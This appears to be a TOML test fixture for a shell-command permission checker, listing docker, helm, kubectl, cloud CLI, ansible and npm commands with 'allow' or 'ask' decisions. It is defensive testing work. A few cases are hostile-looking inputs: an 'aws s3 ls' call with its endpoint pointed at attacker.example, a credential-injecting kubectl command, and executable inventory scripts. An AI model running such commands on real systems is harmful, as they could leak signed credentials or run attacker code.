[meta]
description = "Container / cloud / ansible handlers — command -> decision"

# Migrated from docker.rs, helm.rs, cloud.rs, ansible.rs unit tests. Only pure
# command_name+args cases. docker/kubectl `exec` (remote recurse) and the
# `-o/--output` redirect cases stay white-box (they assert non-decision variants).

# ---- docker / podman ----
[[case]]
command = "docker ps"
decision = "allow"

[[case]]
command = "docker compose ps"
decision = "allow"

[[case]]
command = "docker compose up"
decision = "ask"

[[case]]
command = "docker run alpine"
decision = "ask"

[[case]]
command = "docker save myimage"
decision = "allow"

[[case]]
command = "docker export container"
decision = "allow"

[[case]]
command = "podman ps"
decision = "allow"

# #160: grouped management nouns (image/system/network/volume/config/context)
# previously Allowed regardless of action; now the action itself is checked.
[[case]]
command = "docker system prune -af --volumes"
decision = "ask"

[[case]]
command = "docker image rm foo"
decision = "ask"

[[case]]
command = "docker volume prune -f"
decision = "ask"

[[case]]
command = "docker network rm mynet"
decision = "ask"

[[case]]
command = "docker context use foo"
decision = "ask"

[[case]]
command = "docker system df"
decision = "allow"

[[case]]
command = "docker network ls"
decision = "allow"

[[case]]
command = "docker image ls"
decision = "allow"

[[case]]
command = "docker volume ls"
decision = "allow"

[[case]]
command = "docker config ls"
decision = "allow"

[[case]]
command = "docker context ls"
decision = "allow"

# ---- helm ----
[[case]]
command = "helm list"
decision = "allow"

[[case]]
command = "helm install myrelease chart"
decision = "ask"

[[case]]
command = "helm install myrelease chart --dry-run"
decision = "allow"

[[case]]
command = "helm upgrade myrelease chart --dry-run"
decision = "allow"

[[case]]
command = "helm dependency list"
decision = "allow"

[[case]]
command = "helm repo list"
decision = "allow"

[[case]]
command = "helm repo add name url"
decision = "ask"

[[case]]
command = "helm plugin list"
decision = "allow"

[[case]]
command = "helm rollback myrelease 1 --dry-run"
decision = "allow"

[[case]]
command = "helm uninstall myrelease"
decision = "ask"

[[case]]
command = "helm --help"
decision = "allow"

# ---- kubectl / aws / gcloud / az ----
[[case]]
command = "kubectl get pods"
decision = "allow"

[[case]]
command = "kubectl apply -f deploy.yaml"
decision = "ask"

# #160: `config` was a blanket-safe noun; now only read children are safe.
[[case]]
command = "kubectl config view"
decision = "allow"

[[case]]
command = "kubectl config set-credentials evil --token=x"
decision = "ask"

[[case]]
command = "kubectl config use-context foo"
decision = "ask"

[[case]]
command = "aws ec2 describe-instances"
decision = "allow"

[[case]]
command = "aws ec2 create-instance"
decision = "ask"

# #160: get-login-password prints a registry credential; the `get-` prefix
# would otherwise mark it safe.
[[case]]
command = "aws ecr get-login-password"
decision = "ask"

# #160: a non-localhost --endpoint-url redirects a signed request off AWS.
[[case]]
command = "aws s3 ls --endpoint-url http://attacker.example"
decision = "ask"

[[case]]
command = "aws s3 ls --endpoint-url http://localhost:4566"
decision = "allow"

[[case]]
command = "aws s3 ls"
decision = "allow"

[[case]]
command = "gcloud compute instances list"
decision = "allow"

# #160: the old "last token over ALL args" heuristic let a mutating verb
# hide before a trailing positional (`list`) that isn't actually the action.
[[case]]
command = "gcloud compute instances delete list"
decision = "ask"

[[case]]
command = "gsutil ls"
decision = "allow"

[[case]]
command = "az vm list"
decision = "allow"

[[case]]
command = "az group show --name foo"
decision = "allow"

# #160: `--name list` previously made the flag *value* the resolved "action".
[[case]]
command = "az group delete --name list --yes"
decision = "ask"

# ---- ansible family ----
[[case]]
command = "ansible-doc module_name"
decision = "allow"

[[case]]
command = "ansible-lint playbook.yml"
decision = "allow"

[[case]]
command = "ansible all -m ping --check"
decision = "allow"

[[case]]
command = "ansible all -m ping -C"
decision = "allow"

[[case]]
command = "ansible all --list-hosts"
decision = "allow"

[[case]]
command = "ansible all -m shell"
decision = "ask"

[[case]]
command = "ansible-playbook site.yml --check"
decision = "allow"

[[case]]
command = "ansible-playbook site.yml --syntax-check"
decision = "allow"

[[case]]
command = "ansible-playbook site.yml --list-tasks"
decision = "allow"

[[case]]
command = "ansible-playbook site.yml --list-tags"
decision = "allow"

[[case]]
command = "ansible-playbook site.yml --list-hosts"
decision = "allow"

[[case]]
command = "ansible-playbook site.yml -C"
decision = "allow"

[[case]]
command = "ansible-playbook site.yml"
decision = "ask"

[[case]]
command = "ansible-vault view secrets.yml"
decision = "allow"

[[case]]
command = "ansible-vault encrypt secrets.yml"
decision = "ask"

[[case]]
command = "ansible-vault"
decision = "ask"

[[case]]
command = "ansible-galaxy list"
decision = "allow"

[[case]]
command = "ansible-galaxy search nginx"
decision = "allow"

[[case]]
command = "ansible-galaxy info geerlingguy.docker"
decision = "allow"

[[case]]
command = "ansible-galaxy install geerlingguy.docker"
decision = "ask"

[[case]]
command = "ansible-galaxy"
decision = "ask"

[[case]]
command = "ansible-config list"
decision = "allow"

[[case]]
command = "ansible-config dump"
decision = "allow"

[[case]]
command = "ansible-config view"
decision = "allow"

[[case]]
command = "ansible-config init"
decision = "ask"

[[case]]
command = "ansible-config"
decision = "ask"

[[case]]
command = "ansible-inventory --list"
decision = "allow"

[[case]]
command = "ansible-inventory --graph"
decision = "allow"

[[case]]
command = "ansible-inventory --host webserver1"
decision = "allow"

[[case]]
command = "ansible-inventory -i hosts"
decision = "ask"

# #160: `--list` with a dynamic (executable) inventory still runs an
# attacker-controlled script; only static-file inventories stay Allow.
[[case]]
command = "ansible-inventory --list -i ./inv.sh"
decision = "ask"

[[case]]
command = "ansible-inventory --list -i inventory.ini"
decision = "allow"

[[case]]
command = "ansible-inventory --list -i inventory.yml"
decision = "allow"

# #160 remediation: glued/`=`-joined inventory flags (`-i./inv.sh`,
# `--inventory=./inv.sh`) previously bypassed get_flag_value (space-separated
# form only), letting the dynamic-inventory check fall through to Allow.
[[case]]
command = "ansible-inventory --list --inventory=./inv.sh"
decision = "ask"

[[case]]
command = "ansible-inventory --list -i./inv.sh"
decision = "ask"

# Contrast: the same glued forms with a static inventory file must still Allow.
[[case]]
command = "ansible-inventory --list --inventory=inventory.yml"
decision = "allow"

[[case]]
command = "ansible-inventory --list -iinventory.ini"
decision = "allow"

# ---- npm / yarn / pnpm / bun ----

# #160: `pack` runs prepare/prepack/postpack lifecycle scripts (supply-chain
# RCE); it was on the SAFE list and must now Ask.
[[case]]
command = "npm pack"
decision = "ask"

[[case]]
command = "pnpm pack"
decision = "ask"

[[case]]
command = "npm ls"
decision = "allow"

[[case]]
command = "npm view react"
decision = "allow"
